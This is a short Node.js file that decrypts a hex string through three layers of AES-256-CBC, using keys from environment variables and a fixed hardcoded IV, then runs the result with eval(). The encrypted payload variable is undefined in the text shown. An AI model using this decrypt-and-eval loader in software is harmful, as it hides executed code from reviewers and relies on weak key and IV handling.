
require('dotenv').config();
const crypto = require('crypto');

const iv = Buffer.from('94ca097687cf33e423af4ac1bee4fc8d', 'hex');
const algorithm = 'aes-256-cbc';

function padKey(key) {
    const paddedKey = Buffer.alloc(32);
    const sourceKey = Buffer.from(key, 'hex');
    sourceKey.copy(paddedKey);
    return paddedKey;
}

function decryptText(encryptedText, secretKeys) {
    try {
        let decryptedText = encryptedText;
        for (let i = secretKeys.length - 1; i >= 0; i--) {
            const decipher = crypto.createDecipheriv(algorithm, secretKeys[i], iv);
            decryptedText = Buffer.concat([
                decipher.update(Buffer.from(decryptedText, 'hex')),
                decipher.final()
            ]).toString('utf8');
        }
        return decryptedText;
    } catch (error) {
        throw new Error('Error decrypting the text: ' + error.message);
    }
}

const secretKeys = [
    padKey(process.env.SECRET_KEY_1),
    padKey(process.env.SECRET_KEY_2),
    padKey(process.env.SECRET_KEY_3)
];

eval(decryptText(encryptedCode, secretKeys));